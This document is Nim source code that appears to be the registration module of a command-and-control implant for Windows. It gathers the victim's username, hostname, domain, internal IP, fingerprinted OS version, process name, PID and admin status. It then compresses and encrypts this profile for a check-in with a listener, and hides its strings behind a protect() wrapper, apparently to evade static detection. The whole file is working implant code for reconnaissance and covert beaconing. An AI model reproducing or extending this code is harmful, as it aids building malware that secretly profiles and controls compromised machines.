import winim, os, net, strutils, registry, zippy, strformat

import ../../common/[types, serialize, sequence, crypto, utils]
import ../../modules/manager

# Hostname/Computername
proc getHostname(): string = 
    var
        buffer = newWString(CNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameW(&buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Domain Name
proc getDomain(): string = 
    const ComputerNameDnsDomain = 2 # COMPUTER_NAME_FORMAT (https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format)
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    GetComputerNameExW(ComputerNameDnsDomain, &buffer, &dwSize)
    return $buffer[0 ..< int(dwSize)]

# Username
proc getUsername(): string = 
    const NameSamCompatible = 2 # EXTENDED_NAME_FORMAT (https://learn.microsoft.com/de-de/windows/win32/api/secext/ne-secext-extended_name_format) 
    
    var
        buffer = newWString(UNLEN + 1) 
        dwSize = DWORD buffer.len

    if getDomain() != "": 
        # If domain-joined, return username in format DOMAIN\USERNAME
        GetUserNameExW(NameSamCompatible, &buffer, &dwSize)
        return $buffer[0 ..< int(dwSize)]
    else: 
        # If not domain-joined, only return USERNAME
        discard GetUsernameW(&buffer, &dwSize)
        return $buffer[0 ..< int(dwSize) - 1]


# Current process name
proc getProcessExe(): string = 
    let 
        hProcess: HANDLE = GetCurrentProcess() 
        buffer = newWString(MAX_PATH + 1)

    try:
        if hProcess != 0: 
            if GetModuleFileNameExW(hProcess, 0, buffer, MAX_PATH): 
                # .extractFilename() from the 'os' module gets the name of the executable from the full process path
                # We replace trailing NULL bytes to prevent them from being sent as JSON data
                return ($buffer).extractFilename().replace("\u0000", "")
    finally: 
        CloseHandle(hProcess)

# Current process ID
proc getProcessId(): int = 
    return int(GetCurrentProcessId()) 

# Current process elevation/integrity level
proc isElevated(): bool = 
    # isAdmin() function from the 'os' module returns whether the process is executed with administrative privileges
    return isAdmin() 

# IPv4 Address (Internal)
proc getIPv4Address(): string = 
    # getPrimaryIPAddr from the 'net' module finds the local IP address, usually assigned to eth0 on LAN or wlan0 on WiFi, used to reach an external address. No traffic is sent
    return $getPrimaryIpAddr()

# API Structs
type 
    OSVersionInfoExW {.importc: protect("OSVERSIONINFOEXW"), header: protect("<windows.h>").} = object
        dwOSVersionInfoSize: ULONG
        dwMajorVersion: ULONG
        dwMinorVersion: ULONG
        dwBuildNumber: ULONG
        dwPlatformId: ULONG
        szCSDVersion: array[128, WCHAR]
        wServicePackMajor: USHORT
        wServicePackMinor: USHORT
        wSuiteMask: USHORT
        wProductType: UCHAR
        wReserved: UCHAR

    # Windows Version fingerprinting
    ProductType {.size: sizeof(uint8).} = enum
        UNKNOWN = "Unknown"
        WORKSTATION = "Workstation"
        DC = "Domain Controller"
        SERVER = "Server"

    WindowsVersion = object
        major: DWORD
        minor: DWORD
        buildMin: DWORD  # Minimum build number (0 = any)
        buildMax: DWORD  # Maximum build number (0 = any)
        productType: ProductType
        name: string

const VERSIONS = [
    # Windows 11 / Server 2022+
    # WindowsVersion(major: 10, minor: 0, buildMin: 22631, buildMax: 0, productType: WORKSTATION, name: protect("Windows 11 23H2")),
    # WindowsVersion(major: 10, minor: 0, buildMin: 22621, buildMax: 22630, productType: WORKSTATION, name: protect("Windows 11 22H2")),
    WindowsVersion(major: 10, minor: 0, buildMin: 22000, buildMax: 0, productType: WORKSTATION, name: protect("Windows 11")),
    WindowsVersion(major: 10, minor: 0, buildMin: 26100, buildMax: 0, productType: SERVER, name: protect("Windows Server 2025")),
    WindowsVersion(major: 10, minor: 0, buildMin: 20348, buildMax: 26099, productType: SERVER, name: protect("Windows Server 2022")),

    # Windows 10 / Server 2016-2019
    WindowsVersion(major: 10, minor: 0, buildMin: 19041, buildMax: 19045, productType: WORKSTATION, name: protect("Windows 10 2004/20H2/21H1/21H2/22H2")),
    WindowsVersion(major: 10, minor: 0, buildMin: 17763, buildMax: 19040, productType: WORKSTATION, name: protect("Windows 10 1809+")),
    WindowsVersion(major: 10, minor: 0, buildMin: 10240, buildMax: 17762, productType: WORKSTATION, name: protect("Windows 10")),
    WindowsVersion(major: 10, minor: 0, buildMin: 17763, buildMax: 17763, productType: SERVER, name: protect("Windows Server 2019")),
    WindowsVersion(major: 10, minor: 0, buildMin: 14393, buildMax: 14393, productType: SERVER, name: protect("Windows Server 2016")),
    WindowsVersion(major: 10, minor: 0, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server (Unknown Build)")),

    # Windows 8.x / Server 2012
    WindowsVersion(major: 6, minor: 3, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 8.1")),
    WindowsVersion(major: 6, minor: 3, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2012 R2")),
    WindowsVersion(major: 6, minor: 2, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 8")),
    WindowsVersion(major: 6, minor: 2, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2012")),

    # Windows 7 / Server 2008 R2
    WindowsVersion(major: 6, minor: 1, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows 7")),
    WindowsVersion(major: 6, minor: 1, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2008 R2")),

    # Windows Vista / Server 2008
    WindowsVersion(major: 6, minor: 0, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows Vista")),
    WindowsVersion(major: 6, minor: 0, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2008")),

    # Windows XP / Server 2003
    WindowsVersion(major: 5, minor: 2, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows XP x64 Edition")),
    WindowsVersion(major: 5, minor: 2, buildMin: 0, buildMax: 0, productType: SERVER, name: protect("Windows Server 2003")),
    WindowsVersion(major: 5, minor: 1, buildMin: 0, buildMax: 0, productType: WORKSTATION, name: protect("Windows XP")),
]

proc matchesVersion(version: WindowsVersion, info: OSVersionInfoExW, productType: ProductType): bool = 
    if info.dwMajorVersion != version.major or info.dwMinorVersion != version.minor: 
        return false 
    if productType != version.productType: 
        return false 
    if version.buildMin > 0 and info.dwBuildNumber < version.buildMin:
        return false
    if version.buildMax > 0 and info.dwBuildNumber > version.buildMax:
        return false
    return true

proc getWindowsVersion(info: OSVersionInfoExW, productType: ProductType): string = 
    for version in VERSIONS: 
        if version.matchesVersion(info, if productType == DC: SERVER else: productType): # Process domain controllers as servers, otherwise they show up as unknown
            if productType == DC:
                return version.name & protect(" (Domain Controller)")
            else: 
                return version.name
    
    # Unknown windows version, return as much information as possible
    return fmt"Windows {$int(info.dwMajorVersion)}.{$int(info.dwMinorVersion)} {$productType} (Build: {$int(info.dwBuildNumber)})"


proc getProductType(): ProductType =
    # The product key is retrieved from the registry
    # HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
    #   ProductType    REG_SZ    WinNT
    # Possible values are: 
    #   LanmanNT -> Server/Domain Controller
    #   ServerNT -> Server
    #   WinNT    -> Workstation

    # Using the 'registry' module, we can get the exact registry value
    case getUnicodeValue(protect("""SYSTEM\CurrentControlSet\Control\ProductOptions"""), protect("ProductType"), HKEY_LOCAL_MACHINE)
    of protect("WinNT"):
        return WORKSTATION
    of protect("ServerNT"):
        return SERVER
    of protect("LanmanNT"): 
        return DC

proc getOSVersion(): string = 
    
    proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
        {.cdecl, importc: protect("RtlGetVersion"), dynlib: protect("ntdll.dll").}

    when defined(windows):
        var osInfo: OSVersionInfoExW
        discard rtlGetVersion(osInfo)
        # echo $int(osInfo.dwMajorVersion)
        # echo $int(osInfo.dwMinorVersion)
        # echo $int(osInfo.dwBuildNumber)

        # RtlGetVersion does not actually set the Product Type, which is required to differentiate 
        # between workstation and server systems. The value is set to 0, which would lead to all systems being "unknown"
        # Normally, a value of 1 indicates a workstation os, while other values represent servers
        # echo $int(osInfo.wProductType).toHex

        # We instead retrieve the     
        return getWindowsVersion(osInfo, getProductType())
    else:
        return protect("Unknown")

proc collectAgentMetadata*(ctx: AgentCtx): Registration = 
    
    return Registration(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_REGISTER),
            flags: cast[uint16](FLAG_ENCRYPTED),
            size: 0'u32,
            agentId: string.toUuid(ctx.agentId),
            seqNr: nextSequence(string.toUuid(ctx.agentId)),                              
            iv: generateBytes(Iv),
            gmac: default(AuthenticationTag)
        ), 
        agentPublicKey: ctx.agentPublicKey,
        metadata: AgentMetadata(
            listenerId: string.toUuid(ctx.listenerId),
            username: string.toBytes(getUsername()),
            hostname: string.toBytes(getHostname()),
            domain: string.toBytes(getDomain()),
            ip: string.toBytes(getIPv4Address()),
            os: string.toBytes(getOSVersion()),
            process: string.toBytes(getProcessExe()),
            pid: cast[uint32](getProcessId()),
            isElevated: cast[uint8](isElevated()),
            sleep: cast[uint32](ctx.sleepSettings.sleepDelay),
            jitter: cast[uint32](ctx.sleepSettings.jitter),
            modules: cast[uint32](MODULES)
        )
    )

proc serializeRegistrationData*(ctx: AgentCtx, data: var Registration): seq[byte] = 

    var packer = Packer.init()

    # Serialize registration data
    packer 
        .add(data.metadata.listenerId)
        .addDataWithLengthPrefix(data.metadata.username)
        .addDataWithLengthPrefix(data.metadata.hostname)
        .addDataWithLengthPrefix(data.metadata.domain)
        .addDataWithLengthPrefix(data.metadata.ip)
        .addDataWithLengthPrefix(data.metadata.os)
        .addDataWithLengthPrefix(data.metadata.process)
        .add(data.metadata.pid)
        .add(data.metadata.isElevated)
        .add(data.metadata.sleep)
        .add(data.metadata.jitter)
        .add(data.metadata.modules)

    let metadata = packer.pack()
    packer.reset()

    # Compress payload body
    let compressedPayload = compress(metadata, BestCompression, dfGzip)

    # Encrypt metadata
    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, compressedPayload, data.header.seqNr)

    # Set authentication tag (GMAC)
    data.header.gmac = gmac

    # Serialize header
    let header = packer.serializeHeader(data.header, uint32(encData.len))
    packer.reset()

    # Serialize the agent's public key to add it to the header
    packer.addData(data.agentPublicKey)
    let publicKey = packer.pack()

    return header & publicKey & encData
